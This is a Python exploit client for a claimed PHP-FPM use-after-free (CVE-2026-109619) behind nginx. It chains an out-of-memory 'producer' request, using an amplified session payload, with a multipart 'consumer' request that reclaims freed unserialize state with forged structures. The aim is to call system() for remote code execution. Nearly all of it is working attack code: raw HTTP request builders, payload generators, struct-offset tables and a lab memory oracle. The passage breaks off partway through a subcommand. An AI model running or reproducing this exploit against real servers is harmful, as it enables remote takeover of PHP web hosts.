#!/usr/bin/env python3
"""
php2shell_fpm.py — CVE-2026-109619 exploitation client for nginx + PHP-FPM.

The upstream Apache chain (progress-cache UAF, vendor exploit.py stages 1-3)
needs a pre-RINIT OOM, which on FPM kills the worker (fpm_main.c:1871 ->
FPM_EXIT_SOFTWARE).  The FPM-viable primitive is the cross-request
BG(unserialize) stale state:

  producer A   GET app.php + Cookie PHPSESSID=<big-session>
               -> session_start() decodes a ~4MB session post-RINIT -> OOM
               -> php_execute_script's zend_try catches the bailout, the
                  worker survives, BG(unserialize) keeps {level=1, data=d}
                  pointing at the (teardown-freed) 8216-byte struct.
  consumer B   multipart POST (pre-RINIT): the rfc1867 handler runs inside
               php_hash_environment(), i.e. BEFORE zend_activate_modules()
               (main.c:1873-1874) where PHP_RINIT(basic) would memset BG.
               php_session_initialize() -> php_session_decode() ->
               php_var_unserialize_init() reuses d.  B reclaims d's slot with
               a controlled buffer and plants a forged var_entries.

  The producer arm has two modes (--arm-mode, "auto" picks by origin):
  builder  a second surface with a higher memory_limit writes the big
           session (the classic two-pool path; both surfaces can share one
           port behind --builder-prefix).
  growth   ONE stock surface: an amplified session_decode (a wide nested
           array payload) multiplies memory ~22x per payload byte while
           BG(unserialize).level == 1, so a single POST OOMs inside
           unserialize() - no big session file, no memory_limit split, no
           single-worker pinning (the arm/consume fan out over --workers).

Lab-only aid: the /proc/<pid>/mem oracle reads BG(unserialize).data (d),
the worker's PIE base and buffer addresses, making the reclaim deterministic
to calibrate.  `no-oracle` removes that oracle from the exploit path: it takes the two
absolute bases from an HTTP-only stale-string OOB leak, from --chunk/--pie,
or from /proc/<pid>/maps, then brute-forces the two struct slots.

Subcommands:
  lifecycle        worker-death matrix (pre- vs post-RINIT OOM)
  oracle           print worker pid, pie base, chunk base, d, level
  build-oom        builder-pool POST -> ~4MB session file (cleanup=Off)
  build-ref        builder-pool POST ref.php -> session file with R:2
  producer         one request A (stale BG)
  reclaim-probe    A + patterned B, read back d via oracle (sweep pad sizes)
  primitive        A + B with forged benign var_entries (observable via app.php)
  endgame          A + B with forged ref/array/zif_system chain (RCE proof file)
  leak             HTTP-only chunk/PIE leak from a stale session string
  no-oracle        endgame without /proc/<pid>/mem (HTTP leak, --chunk/--pie,
                   or local maps)
  chain            full pipeline (primitive or endgame phase)
  patchcheck       run lifecycle+oracle+producer+probe on 8.4.26 vs 8.4.27
  probe            checklist: does this target meet every precondition?
"""

from __future__ import annotations

import argparse
import contextlib
import copy
import ipaddress
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

import php2shell_fpm_versions as registry  # noqa: E402

LAB = os.path.join(ROOT, "lab", "fpm")
RUNTIME = os.path.join(LAB, "runtime")

BG_UNSERIALIZE_DATA_OFF = 872   # offsetof(php_basic_globals, unserialize.data)
BG_UNSERIALIZE_LEVEL_OFF = 880
MEM_CHUNK = 0x200000

OOM_SID = b"fmroom000000000001"
REF_SID = b"fpmref000000000001"

PATHS = {
    "app": "/app.php",
    "arm": "/bigvar.php",
    "ref": "/ref.php",
    "probe": "/nope.php",
    "grow": "/grow.php",
    "cookie": "PHPSESSID",
}

# How the producer OOM session is armed on a remote target:
#   builder — two HTTP surfaces (the current behaviour): a builder surface
#             writes the big session, the chain surface OOMs on it.
#   growth  — ONE surface with default settings: the session is grown in
#             small chunks until a decode OOM arms the worker (the save of a
#             session always costs more than the decode of the next round,
#             so a stalled growth leaves the session just under memory_limit
#             and one bigger body tips it over).
#   auto    — growth when --builder is the same origin as --base (one pool),
#             builder otherwise.
ARM_MODE = "builder"
BUILDER_PREFIX = ""      # path prefix of the builder pool on a single port
WORKERS = 1              # arm/consume fan-out; the CLI default is 5 (see
                         # --workers, matching pm.max_children of a stock
                         # pool) - direct API callers keep the pinned 1
GROW_CHUNK = 256 * 1024  # bytes appended to the session per growth round
GROW_FINE = 64 * 1024    # creep size once the coarse rounds stall
GROW_MAX = 4000          # growth rounds before the big-body probe takes over
ARM_BODY = 1900000       # kept for --arm-body overrides; the probe itself
                         # walks PROBE_LADDER (largest first) and caches the
                         # largest body the target accepted


def _cookie(sid: bytes) -> bytes:
    return PATHS["cookie"].encode("latin1") + b"=" + sid


def _origin(url: str) -> str:
    u = urllib.parse.urlsplit(url)
    return f"{u.scheme}://{u.netloc}"


def is_loopback(host: str) -> bool:
    """True when every address for host is a loopback address."""
    if not host:
        return False
    try:
        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
    except socket.gaierror:
        return False
    return bool(infos) and all(
        ipaddress.ip_address(info[4][0]).is_loopback for info in infos)


def remote_targets_allowed(base: str, builder: str | None, allow_remote: bool) -> bool:
    """Remote use is opt-in, matching the Apache dispatcher's safety gate."""
    if allow_remote:
        return True
    for url in (base, builder):
        if not url:
            continue
        host = urllib.parse.urlsplit(url).hostname or ""
        if not is_loopback(host):
            return False
    return True


def configure_paths(args) -> None:
    global ARM_MODE, BUILDER_PREFIX, WORKERS, GROW_CHUNK, GROW_MAX, ARM_BODY
    global _probe_usable
    for key, attr in (("app", "app_path"), ("arm", "arm_path"),
                      ("ref", "ref_path"), ("probe", "probe_path"),
                      ("grow", "grow_path"), ("cookie", "session_cookie")):
        value = getattr(args, attr, None)
        if value:
            PATHS[key] = str(value)
    BUILDER_PREFIX = str(getattr(args, "builder_prefix", "") or "")
    mode = getattr(args, "arm_mode", None) or ARM_MODE
    if mode == "auto":
        base_url = getattr(args, "base", "") or ""
        builder_url = getattr(args, "builder", "") or base_url
        same_origin = _origin(base_url) == _origin(builder_url)
        prefixed = bool(BUILDER_PREFIX)
        mode = "growth" if (same_origin and not prefixed) else "builder"
    ARM_MODE = mode
    WORKERS = max(1, int(getattr(args, "workers", 1) or 1))
    GROW_CHUNK = max(4096, int(getattr(args, "grow_chunk", 0) or GROW_CHUNK))
    GROW_MAX = max(1, int(getattr(args, "grow_max", 0) or GROW_MAX))
    ARM_BODY = max(4096, int(getattr(args, "arm_body", 0) or ARM_BODY))
    # an explicit --arm-body pins the probe size; otherwise the ladder walks
    # PROBE_LADDER and caches whatever the target accepted
    _probe_usable = ARM_BODY if getattr(args, "arm_body", 0) else None


# --------------------------------------------------------------------------- #
# http
# --------------------------------------------------------------------------- #

class Target:
    def __init__(self, url: str, timeout: float = 60.0, prefix: str = ""):
        u = urllib.parse.urlsplit(url)
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or 80
        self.path = u.path or "/"
        self.prefix = prefix
        self.timeout = timeout

    def _p(self, path: str) -> str:
        """Path with the surface prefix applied (builder pool behind /b/)."""
        return (self.prefix + path) if self.prefix else path

    def _connect(self) -> socket.socket:
        sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        return sock

    def _exch(self, request: bytes, read_cap: int = 1 << 22,
              timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
        sock = self._connect()
        sock.settimeout(timeout or self.timeout)
        try:
            sock.sendall(request)
            data = bytearray()
            while len(data) < read_cap:
                try:
                    chunk = sock.recv(65536)
                except OSError:
                    break
                if not chunk:
                    break
                data.extend(chunk)
        finally:
            sock.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        lines = head.decode("latin1", "replace").split("\r\n")
        status = 0
        if lines and re.match(r"HTTP/1\.[01] \d{3}", lines[0]):
            status = int(lines[0].split()[1])
        headers: dict[str, str] = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        return status, headers, body

    def get(self, path: str, cookie: bytes | None = None,
            read_cap: int = 1 << 22,
            timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
        req = (f"GET {self._p(path)} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               f"{extra}Connection: close\r\n\r\n").encode()
        return self._exch(req, read_cap=read_cap, timeout=timeout)

    def post_multipart(self, parts: list[dict], boundary: bytes,
                       cookie: bytes | None = None,
                       read_cap: int = 1 << 22,
                       timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
        body = build_multipart(parts, boundary)
        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
        req = (f"POST {self._p(self.path)} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               f"{extra}"
               f"Content-Type: multipart/form-data; boundary={boundary.decode('latin1')}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
        return self._exch(req, read_cap=read_cap, timeout=timeout)

    def post_urlencoded(self, fields: dict[str, str],
                        cookie: bytes | None = None,
                        path: str | None = None,
                        timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
        body = urllib.parse.urlencode(fields).encode()
        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
        req = (f"POST {self._p(path or self.path)} HTTP/1.1\r\n"
               f"Host: {self.host}:{self.port}\r\n"
               f"{extra}Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
        return self._exch(req, timeout=timeout)

    def post_raw(self, path: str, body: bytes, cookie: bytes | None = None,
                 timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
        """POST an already-encoded application/x-www-form-urlencoded body.

        urlencode() would percent-escape the amplifier payload's braces and
        semicolons, tripling it past post_max_size; the url-encoded parser
        passes raw bytes through untouched as long as they contain no '+'
        or '%', which the payload never does.
        """
        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
        req = (f"POST {self._p(path)} HTTP/1.1\r\n"
               f"Host: {self.host}:{self.port}\r\n"
               f"{extra}Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
        return self._exch(req, timeout=timeout)


def builder_target(url: str, timeout: float = 60.0) -> Target:
    """The builder surface: same client as the chain, with the pool prefix.

    On a single-port deployment the builder pool sits behind a path prefix
    (``--builder-prefix /b``), so every builder request - posts *and* gets -
    is routed there instead of to the chain pool.
    """
    return Target(url, timeout=timeout, prefix=BUILDER_PREFIX)


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        name = part["name"] if isinstance(part["name"], bytes) else part["name"].encode("latin1")
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if part.get("filename") is not None:
            fname = (part["filename"] if isinstance(part["filename"], bytes)
                     else part["filename"].encode("latin1"))
            out += b'; filename="' + fname + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        data = part["data"] if isinstance(part["data"], bytes) else part["data"].encode("latin1")
        out += b"\r\n\r\n" + data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def parse_sid(header_value: str) -> bytes:
    return urllib.parse.unquote_to_bytes(header_value.split(";")[0].strip())


# --------------------------------------------------------------------------- #
# oracle (/proc/<pid>/mem, lab-only)
# --------------------------------------------------------------------------- #

def fpm_prefix(version: str) -> str:
    return os.path.join(RUNTIME, f"php-{version}")


def find_pool_worker(version: str, pool: str) -> int | None:
    marker = f"php-fpm: pool {pool}".encode()
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        try:
            with open(f"/proc/{name}/cmdline", "rb") as handle:
                data = handle.read()
        except OSError:
            continue
        if marker not in data:
            continue
        # workers of every build look alike; match the binary path
        exe = os.readlink(f"/proc/{name}/exe")
        if f"php-{version}" in exe:
            return int(name)
    return None


class Oracle:
    def __init__(self, version: str, pool: str = "chain"):
        self.version = version
        self.pid = find_pool_worker(version, pool)
        if self.pid is None:
            raise RuntimeError(f"no php-fpm '{pool}' worker for {version}")
        self.maps = self._read_maps()
        self.pie_base = self._pie_base()
        self.bg = self.pie_base + self._symbol("basic_globals")
        self.zif = self.pie_base + self._symbol("zif_system")
        self.dtor = self.pie_base + self._symbol("zval_ptr_dtor")

    def _read_maps(self) -> list[tuple[int, int, str]]:
        out = []
        with open(f"/proc/{self.pid}/maps", encoding="utf-8") as handle:
            for line in handle:
                rng, perms, *rest = line.split()
                start_s, end_s = rng.split("-")
                out.append((int(start_s, 16), int(end_s, 16), perms))
        return out

    def _pie_base(self) -> int:
        exe = os.readlink(f"/proc/{self.pid}/exe")
        with open(f"/proc/{self.pid}/maps", encoding="utf-8") as handle:
            base = None
            for line in handle:
                parts = line.split()
                if parts[-1] != exe:
                    continue
                start = int(parts[0].split("-")[0], 16)
                if base is None or start < base:
                    base = start
        if base is None:
            raise RuntimeError("pie base not found")
        return base

    def _symbol(self, name: str) -> int:
        binary = os.readlink(f"/proc/{self.pid}/exe")
        result = subprocess.run(["nm", binary], capture_output=True, text=True)
        # PHP <= 7.2 exports the zval destructor with a leading underscore
        aliases = {name, "_" + name}
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[-1] in aliases:
                return int(parts[0], 16)
        raise RuntimeError(f"symbol {name} not found")

    def read(self, addr: int, size: int) -> bytes:
        with open(f"/proc/{self.pid}/mem", "rb") as handle:
            handle.seek(addr)
            return handle.read(size)

    def u64(self, addr: int) -> int:
        return struct.unpack("<Q", self.read(addr, 8))[0]

    def u32(self, addr: int) -> int:
        return struct.unpack("<I", self.read(addr, 4))[0]

    def unserialize_data(self) -> int:
        data_off, _level_off = _bg_offsets(self.version)
        return self.u64(self.bg + data_off)

    def unserialize_level(self) -> int:
        _data_off, level_off = _bg_offsets(self.version)
        return self.u32(self.bg + level_off)

    def chunk_base(self, addr: int) -> int | None:
        for start, end, perms in self.maps:
            if start <= addr < end and "rw-p" in perms and end - start >= MEM_CHUNK:
                base = addr & ~(MEM_CHUNK - 1)
                if start <= base and base + MEM_CHUNK <= end:
                    return base
        return None

    def refresh(self) -> None:
        self.maps = self._read_maps()

    def dump(self) -> None:
        d = self.unserialize_data()
        level = self.unserialize_level()
        chunk = self.chunk_base(d) if d else None
        print(f"worker      pid={self.pid}")
        print(f"pie_base    0x{self.pie_base:x}")
        print(f"basic_glob  0x{self.bg:x}")
        print(f"zif_system  0x{self.zif:x}")
        print(f"zval_ptrdtor 0x{self.dtor:x}")
        print(f"BG.data     0x{d:x}  level={level}")
        print(f"chunk_base  {hex(chunk) if chunk else None}")


# --------------------------------------------------------------------------- #
# lab helpers
# --------------------------------------------------------------------------- #

def session_file(version: str, sid: bytes) -> str:
    return os.path.join(fpm_prefix(version), "session", f"sess_{sid.decode('latin1')}")


def big_session_post(builder: Target, sid: bytes, size: int) -> tuple[int, bytes]:
    """Progress-key 4MB string -> session file with a huge key (cleanup=Off)."""
    parts = [
        {"name": PATHS["cookie"], "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"A" * size},
        {"name": "f", "filename": "a.txt", "data": b"x" * 16},
    ]
    status, headers, body = builder.post_multipart(parts, b"BOUNDSZ16", timeout=180.0)
    return status, body


def ref_session_post(builder: Target, sid: bytes) -> tuple[int, bytes]:
    """ref.php stores $_SESSION['r'] =& $_SESSION['a'] -> 'R:2' in the file."""
    status, _headers, body = builder.post_urlencoded(
        {"x": "1"}, cookie=_cookie(sid), path=PATHS["ref"])
    return status, body


def producer_get(chain: Target, sid: bytes) -> tuple[int, bytes]:
    status, _headers, body = chain.get(PATHS["app"], cookie=_cookie(sid))
    return status, body


# --------------------------------------------------------------------------- #
# growth arm (single surface, default php.ini)
# --------------------------------------------------------------------------- #

# Decode-side amplifier: payload sizes tried largest first.  A payload of
# N bytes decodes to roughly 22N bytes of live HashTables (28-byte
# two-deep children -> ~620 bytes), so a ~8 MB payload (post_max_size's
# default is 8M) crosses memory_limit of a 128M surface from an EMPTY
# session.  Fronts that cap bodies descend the ladder.
AMPLIFIER_SIZES = (8200000, 6000000, 4800000, 3000000, 1000000)
_amplifier_cache: dict[int, bytes] = {}
_amplifier_usable: int | None = None


def _amplifier_payload(nbytes: int) -> bytes:
    """A session-format string whose decode multiplies memory ~20x.

    Shape: ``k|a:<n>{i:0;a:1:{i:0;a:1:{i:0;N;}}...}`` - one wide array of
    two-deep non-empty sub-arrays.  Empty arrays are useless here (PHP
    interns ``a:0:{}`` process-wide, so they cost nothing); a two-element
    nesting gives ~620 bytes of live HashTables per ~28 payload bytes while
    keeping the nesting depth at 4 (unserialize_max_depth is never
    approached).  The decode runs with BG(unserialize).level == 1, so an
    OOM anywhere inside leaves exactly the stale struct the chain reclaims.
    """
    cached = _amplifier_cache.get(nbytes)
    if cached is not None:
        return cached
    child = b"a:1:{i:0;a:1:{i:0;N;}}"
    # Short strings FIRST: the stale var_hash then carries them at
    # data[0..3], which is exactly what the HTTP leak's R:2 hook reads
    # (the classic bigvar.php arm stored k0..k3 for the same reason).
    seed = (b'a|s:2000:"' + b"K" * 2000 + b'";'
            b'b|s:2000:"' + b"L" * 2000 + b'";'
            b'c|s:2000:"' + b"M" * 2000 + b'";'
            b'd|s:2000:"' + b"N" * 2000 + b'";')
    # conservative per-child budget: i:<6 digits>;<child> tops out at 32
    # bytes, so a 14-byte margin keeps the total under nbytes and well
    # inside post_max_size (8M) and an 8m client_max_body_size
    count = max(16, min(500000, (nbytes - len(seed)) // (len(child) + 14)))
    items = [b"i:" + str(i).encode("ascii") + b";" + child
             for i in range(count)]
    # full session-format payload: grow.php passes it to session_decode as-is
    blob = (seed + b"k|a:" + str(count).encode("ascii") + b":{"
            + b"".join(items) + b"}")
    _amplifier_cache[nbytes] = blob
    return blob


def _amplifier_arm(target: Target, sid: bytes) -> bool | None:
    """Arm with ONE amplified session_decode.  True=armed, None=survived."""
    global _amplifier_usable
    ladder = (_amplifier_usable,) if _amplifier_usable else AMPLIFIER_SIZES
    for size in ladder:
        payload = _amplifier_payload(size)
        try:
            status, _headers, body = target.post_raw(
                PATHS["grow"], b"p=" + payload, cookie=_cookie(sid),
                timeout=300.0)
        except (OSError, TimeoutError):
            return True      # worker died mid-request: treat as armed
        body = _dechunk(body)
        if status == 413:
            continue         # front caps bodies: try a smaller payload
        if b"GROW_OK" not in body:
            return True      # fatal inside session_decode -> OOM -> armed
        match = re.search(rb"GROW_OK \d+ B(\d+)", body)
        if match and int(match.group(1)) == len(payload):
            _amplifier_usable = size   # payload arrived, decode survived
            return None
        # payload discarded by post_max_size: descend
    return False


def _grow_size(body: bytes) -> int:
    """Bytes of session payload reported by grow.php, or -1."""
    match = re.search(rb"GROW_OK (\d+)", body)
    return int(match.group(1)) if match else -1


def _grow_round(target: Target, sid: bytes, index: int,
                chunk: int | None = None) -> tuple[bool, int]:
    """One growth round.  Returns (armed, session_bytes).

    grow.php echoes GROW_OK only *after* session_start(): a decode OOM is a
    fatal before the marker, which is how the arm is detected over HTTP.
    """
    chunk = GROW_CHUNK if chunk is None else chunk
    fields = {"k": f"g{index:05d}", "v": "A" * chunk}
    try:
        _status, _headers, body = target.post_urlencoded(
            fields, cookie=_cookie(sid), path=PATHS["grow"], timeout=180.0)
    except (OSError, TimeoutError):
        return True, -1     # the worker died mid-request: treat as armed
    body = _dechunk(body)
    if b"GROW_OK" not in body:
        return True, -1     # fatal during session_start() -> OOM -> armed
    return False, _grow_size(body)


# Probe body ladder, largest first: post_max_size's default (8M) accepts
# 8,000,000, and the crossing formula (2F + body + baseline >= memory_limit,
# everything in bytes) needs ~8 MB of body when the save wall sits at ~63 MB
# of a 128M surface.  The smaller steps adapt to fronts that cap bodies.
PROBE_LADDER = (8000000, 5000000, 3000000, 1900000, 1040000)
_probe_usable: int | None = None   # largest body this target actually took


def _arm_probe(target: Target, sid: bytes) -> bool:
    """Tip a stalled growth over memory_limit with one bigger body.

    The body is parsed before RINIT and stays allocated while the session
    decodes, so it raises the decode peak by its own size - the one lever
    the save does not get: the save carries the encode buffer on top of
    the zvals, which is why it dies first.  grow.php reports how many body
    bytes arrived (``B<n>``); a body over post_max_size is discarded
    silently, which the ladder treats like a 413 and descends past.
    """
    global _probe_usable
    ladder = (_probe_usable,) if _probe_usable else PROBE_LADDER
    for body_bytes in ladder:
        fields = {"x": "B" * body_bytes}
        try:
            status, _headers, body = target.post_urlencoded(
                fields, cookie=_cookie(sid), path=PATHS["grow"],
                timeout=300.0)
        except (OSError, TimeoutError):
            return True
        body = _dechunk(body)
        if status == 413:
            continue        # front caps bodies: try a smaller one
        if b"GROW_OK" not in body:
            return True     # fatal before the marker -> OOM -> armed
        match = re.search(rb"GROW_OK \d+ B(\d+)", body)
        arrived = int(match.group(1)) if match else -1
        if arrived == body_bytes:
            _probe_usable = body_bytes   # full body landed, still under
            return False
        # body discarded by post_max_size: descend
    print(f"[!] no probe body got through (413 or post_max_size below "
          f"{PROBE_LADDER[-1]}): raise client_max_body_size to >= 2m and "
          f"post_max_size to 8M on the target")
    return False


def grow_until_armed(base: str, sid: bytes = OOM_SID) -> bool:
    """Arm a decode-side OOM on ONE default surface.

    Primary path: a single amplified ``session_decode`` - a few MB of wide
    empty-array payload decodes to far more than memory_limit while
    BG(unserialize).level == 1, with no session file, no save, and no wall
    to chase.  Fallback: grow the session to the save wall and cross it
    with a big-body probe (for fronts that cap payloads too low for the
    amplifier).  Either way the OOM runs post-RINIT inside a
    session_start()/session_decode() call, which is the producer arm.
    """
    target = Target(base)
    amplified = _amplifier_arm(target, sid)
    if amplified:
        print("[*] arm: amplified session_decode OOM (single request)")
        return True
    if amplified is None:
        print("[*] arm: amplifier payload arrived but did not cross; "
              "falling back to growth")
    else:
        print("[*] arm: no amplifier payload got through (413 or "
              "post_max_size); falling back to growth")
    last, stall, probes = -1, 0, 0
    coarse = True
    for index in range(GROW_MAX):
        chunk = GROW_CHUNK if coarse else GROW_FINE
        armed, size = _grow_round(target, sid, index, chunk)
        if armed:
            print(f"[*] growth arm: OOM at round {index}")
            return True
        if size > last:
            # progress: reopen the coarse throttle (the save landed)
            if not coarse:
                print(f"[*] growth resumed at ~{size} bytes")
            last, stall, probes = size, 0, 0
            coarse = True
            continue
        # no progress: either the save did not land yet or we are at the wall
        stall += 1
        if stall >= 2 and coarse:
            print(f"[*] growth stalled at ~{last} bytes; creeping with "
                  f"{GROW_FINE} byte rounds")
            coarse, stall = False, 0
            continue
        if not coarse and stall >= 6:
            if probes % 3 == 0:
                print(f"[*] probing the wall at ~{last} bytes ({probes + 1})")
                if _arm_probe(target, sid):
                    return True
            probes += 1
            stall = 0
            if probes >= 40:
                break
        time.sleep(0.05)    # give the previous request's save time to land
    # A grown session shrinks the payload the amplifier needs: with ~60 MB
    # on disk a 3 MB rung crosses memory_limit even on a front that caps
    # bodies around 3-4 m, so give the amplifier one more shot here.
    if _amplifier_arm(target, sid):
        print("[*] arm: amplified session_decode OOM after growth")
        return True
    print(f"[!] growth reached ~{last} bytes but no OOM crossed "
          f"memory_limit: arming needs 2 x session + probe body >= the "
          f"limit, so either the front capped the probe body below "
          f"{PROBE_LADDER[-1]} bytes (nginx client_max_body_size 8m, "
          f"post_max_size 8M), session.lazy_write=On caps the save wall "
          f"near 40 MB, or the consumer memory_limit is too high for this "
          f"surface - a second surface with a lower memory_limit still "
          f"works.")
    return False


def _remote_arm(base: str, builder_url: str, size: int) -> None:
    """Rebuild the OOM session and fire the producer (remote paths).

    builder mode fans out over WORKERS so every pool worker carries the
    stale state (the consume then only has to land on *an* armed worker);
    growth mode arms the worker that runs the final round and the caller
    consumes immediately after it.
    """
    if ARM_MODE == "growth":
        # One amplifier request arms the worker that takes it; repeat across
        # the pool so every pm.max_children worker carries the stale state
        # (RINIT only clears the worker a request lands on, so earlier arms
        # stay standing).  Each round is a single request.
        for _ in range(WORKERS):
            if not grow_until_armed(base):
                raise RuntimeError(
                    "growth arm failed: the session never reached "
                    "memory_limit (raise --arm-body, lower --grow-chunk, or "
                    "point --grow-path at an endpoint that appends to the "
                    "session)")
        return
    chain = Target(base)
    builder = builder_target(builder_url)
    for _ in range(WORKERS):
        big_session_post(builder, OOM_SID, size)
        producer_get(chain, OOM_SID)


# --------------------------------------------------------------------------- #
# shared exploit pipeline
# --------------------------------------------------------------------------- #

def _arm_stale(base: Target, builder: Target, oracle: Oracle, size: int) -> int:
    """Rebuild the OOM session (php_session_cancel_decode unlinked it during
    the previous bailout), fire the producer, return stale BG.data.

    Note: any later request that reaches RINIT memsets BG(basic), so the
    stale state must be re-armed immediately before the consume."""
    big_session_post(builder, OOM_SID, size)
    producer_get(base, OOM_SID)
    d = oracle.unserialize_data()
    if not d or oracle.unserialize_level() != 1:
        raise RuntimeError("stale state not armed")
    return d


def _reclaim_pads(version: str, override: list[int] | None = None) -> list[int]:
    if override:
        return [int(x) for x in override]
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            return [int(x) for x in
                    json.load(handle)["fpm"].get("reclaim_pads",
                                                 [4096, 4096, 4096])]
    except (OSError, KeyError, TypeError, ValueError):
        return [4096, 4096, 4096]


def _load_profile(version: str) -> dict | None:
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            return json.load(handle)
    except (OSError, ValueError):
        return None


# Layout of the structures the forged buffer impersonates.  The values are
# the PHP 8.4 ones and are only used when a profile carries no "layout"
# section (profiles generated by tools/php2shell_fpm_profile.py always do).
DEFAULT_LAYOUT = {
    "unserialize_data": {
        "last": 0, "first_dtor": 8, "last_dtor": 16, "allowed_classes": 24,
        "ref_props": 32, "cur_depth": 40, "max_depth": 48, "entries": 56,
        "size": 8216,
    },
    "var_entries": {"used_slots": 0, "next": 8, "data": 16, "max": 1018},
    "zval": {"value": 0, "type_info": 8, "context": 12, "size": 16},
    "zend_array": {"gc": 0, "flags": 8, "nTableMask": 12, "arData": 16,
                   "nNumUsed": 24, "nNumOfElements": 28, "nTableSize": 32,
                   "pDestructor": 48},
    "zend_reference": {"gc": 0, "val": 8, "val_type_info": 16, "sources": 24},
    "zend_string": {"gc": 0, "h": 8, "len": 16, "val": 24},
    "zend_execute_data": {"opline": 0, "call": 8, "return_value": 16,
                          "func": 24, "num_args": 44, "arg1": 80},
    "bucket": {"val": 0, "h": 16, "key": 24},
}


def _layout(version: str) -> dict:
    """Struct layout of a PHP build (from its profile)."""
    profile = _load_profile(version)
    layout = copy.deepcopy(DEFAULT_LAYOUT)
    if profile and isinstance(profile.get("layout"), dict):
        for section, values in profile["layout"].items():
            if isinstance(values, dict):
                merged = dict(layout.get(section, {}))
                merged.update(values)
                layout[section] = merged
    return layout


def _bg_offsets(version: str) -> tuple[int, int]:
    """(data offset, level offset) of BG(unserialize) for a build."""
    profile = _load_profile(version)
    if profile:
        meta = profile.get("fpm", {})
        if "bg_unserialize_data_off" in meta and "bg_unserialize_level_off" in meta:
            return int(meta["bg_unserialize_data_off"]), \
                int(meta["bg_unserialize_level_off"])
    return BG_UNSERIALIZE_DATA_OFF, BG_UNSERIALIZE_LEVEL_OFF


def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
                 size: int = 12288,
                 pads: list[int] | tuple[int, ...] = (4096, 4096, 4096)
                 ) -> int | None:
    """Land a patterned reclaim buffer (pads + one big field) over d
    against a 404 endpoint, scan the mem chunk for the unique marker, and
    return the content offset K such that buffer+K == d."""
    chunk = oracle.chunk_base(d)
    if chunk is None:
        return None
    # Unique marker: the heap retains freed buffer contents across requests,
    # so a fixed marker could match a stale copy from a previous run.
    marker = b"MK" + os.urandom(6)
    content = bytearray(b"\x00" * size)
    content[0:8] = marker
    parts = [{"name": f"pad{i}", "data": b"C" * pad}
             for i, pad in enumerate(pads)]
    parts.append({"name": "big", "data": bytes(content)})
    chain404.post_multipart(parts, b"PRBLAND1")
    oracle.refresh()
    data = oracle.read(chunk, MEM_CHUNK)
    hits, idx = [], 0
    while True:
        pos = data.find(marker, idx)
        if pos < 0:
            break
        hits.append(pos)
        idx = pos + 1
    d_off = d - chunk
    cover = [h for h in hits if h <= d_off and d_off + need <= h + size]
    if os.environ.get("PHP2SHELL_DEBUG"):
        print(f"[debug] d={d:#x} chunk={chunk:#x} d_off={d_off:#x} "
              f"need={need:#x} size={size:#x} hits={[hex(h) for h in hits]} "
              f"cover={[hex(h) for h in cover]}")
    if not cover:
        print(f"[!] no covering reclaim buffer (hits={[hex(h) for h in hits]})")
        return None
    k = d_off - cover[0]
    print(f"[*] d=0x{d:x} reclaim covers d at content off {k:#x}")
    return k


def _rebuild_ref_and_arm(base: Target, builder: Target, oracle: Oracle,
                         oom_size: int) -> int:
    """Rebuild the ref session (a failed consume saves the corrupted decode
    back to the file), re-arm the stale state, and return the re-armed d."""
    ref_session_post(builder, REF_SID)
    return _arm_stale(base, builder, oracle, oom_size)


def _consume_b(chainapp: Target, forged: bytes,
               pads: list[int] | tuple[int, ...] = (4096, 4096, 4096)
               ) -> tuple[int, dict[str, str], bytes]:
    """Consume with the forged reclaim buffer.

    Consumer B MUST carry the PHP_SESSION_UPLOAD_PROGRESS field and a file
    part: rfc1867 has to fire the pre-RINIT session_start, otherwise the
    decode would run post-RINIT against a memset BG(unserialize)."""
    parts = [{"name": f"pad{i}", "data": b"C" * pad}
             for i, pad in enumerate(pads)]
    parts.append({"name": "big", "data": forged})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
    parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
    status, headers, body = chainapp.post_multipart(parts, b"CONSUME01",
                                                    cookie=_cookie(REF_SID))
    print(f"[*] consumer status={status}")
    return status, headers, body


# --------------------------------------------------------------------------- #
# subcommands
# --------------------------------------------------------------------------- #

def cmd_lifecycle(args) -> int:
    chain = Target(args.base)
    version = args.version
    worker = find_pool_worker(version, "chain")
